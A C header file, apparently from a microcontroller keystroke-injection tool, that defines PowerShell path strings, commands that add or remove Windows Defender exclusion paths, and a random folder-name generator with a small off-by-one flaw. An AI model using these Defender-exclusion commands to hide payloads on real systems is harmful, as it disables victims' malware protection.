#ifndef MSDEF_H
#define MSDEF_H

#include "alt.hpp"


#define PS_PATH_APPDATA         "$Env:AppData\\"
#define PS_PATH_USERPROFILE     "$env:USERPROFILE\\"
#define PS_PATH_PROGRAMFILES    "$env:ProgramFiles\\"
#define PS_PATH_PROGRAMFILES86  "${env:ProgramFiles(x86)}\\"
#define PS_PATH_TEMP            "$env:TEMP\\"
#define PS_PATH_WINDOWS         "$env:windir\\"
#define PS_PATH_SYSTEM32        "$env:windir\\System32\\"


/*
https://learn.microsoft.com/en-us/powershell/module/defender/add-mppreference
https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference
*/
#define PS_DEF_ADD  "Add-MpPreference -ExclusionPath "
#define PS_DEF_RM   "Remove-MpPreference -ExclusionPath "

typedef struct {
    uint8_t start_c;
    uint8_t end_c;
} rand_ascii;

static const rand_ascii ascii_names[] = {
    {0x30, 0x39}, // numbers
    {0x41, 0x5A}, // uppercase
    {0x61, 0x7A}  // lowercase
};

bool rand_path(char *buff, int buff_size)
{
    if (buff_size <= 4) return false;
    
    int new_buff_len = (int)random(4, buff_size);
    rand_ascii ra;

    for (int i = 0; i < new_buff_len-1; ++i) {
        ra = ascii_names[random(0, 3)];
        buff[i] = random(ra.start_c, ra.end_c + 1);
    }

    buff[new_buff_len] = '\0';

    return true;
}

#endif // MSDEF_H
